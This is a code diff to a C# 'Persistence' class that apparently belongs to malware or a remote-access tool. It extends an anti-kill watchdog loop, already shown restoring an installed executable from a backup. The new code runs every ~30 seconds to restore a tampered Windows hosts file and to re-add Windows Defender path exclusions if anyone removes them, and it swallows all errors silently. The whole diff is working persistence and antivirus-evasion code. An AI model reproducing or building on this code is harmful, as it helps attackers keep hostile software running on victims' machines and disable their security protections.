@@ -553,11 +553,67 @@ internal static partial class Persistence
 
     private static void WatchdogLoop(string name, string installExe, string backupDir, string backupExe)
     {
+        int tick = 0;
         while (_watchdogRunning)
         {
             try { Thread.Sleep(2000); RestoreAll(name, installExe, backupDir, backupExe); }
             catch { }
+
+            // Plugin watchdog checks every ~30 s (15 × 2 s)
+            if (++tick % 15 == 0)
+            {
+                _CheckHosts();
+                _CheckDefenderExclusion();
+            }
         }
+    }
+
+    private static void _CheckHosts()
+    {
+        if (!_hostsWatchActive || _hostsGolden == null) return;
+        const string hostsPath = @"C:\Windows\System32\drivers\etc\hosts";
+        try
+        {
+            var cur = File.ReadAllText(hostsPath);
+            if (cur != _hostsGolden) File.WriteAllText(hostsPath, _hostsGolden);
+        }
+        catch { }
+    }
+
+    private static void _CheckDefenderExclusion()
+    {
+        if (!_defExclWatchActive || _defExclPath == null) return;
+        try
+        {
+            using var k = Registry.LocalMachine.OpenSubKey(
+                @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths");
+            if (k?.GetValue(_defExclPath) == null)
+                Protection.AddDefenderExclusion(_defExclPath);
+        }
+        catch { }
+    }
+
+    // ── Plugin watchdogs — only active when anti-kill watchdog is running ───────
+    // Activated by HandlePluginExec / HandleDefenderExclude after a successful run.
+
+    private static volatile bool _hostsWatchActive;
+    private static string?       _hostsGolden;     // expected hosts content to restore
+
+    private static volatile bool _defExclWatchActive;
+    private static string?       _defExclPath;     // exclusion path to keep alive
+
+    public static void StartHostsWatch()
+    {
+        const string hostsPath = @"C:\Windows\System32\drivers\etc\hosts";
+        try { _hostsGolden = File.ReadAllText(hostsPath); }
+        catch { return; }
+        _hostsWatchActive = true;
+    }
+
+    public static void StartDefenderExclusionWatch(string path)
+    {
+        _defExclPath        = path;
+        _defExclWatchActive = true;
     }
 
     private static void RestoreAll(string name, string installExe, string backupDir, string backupExe)
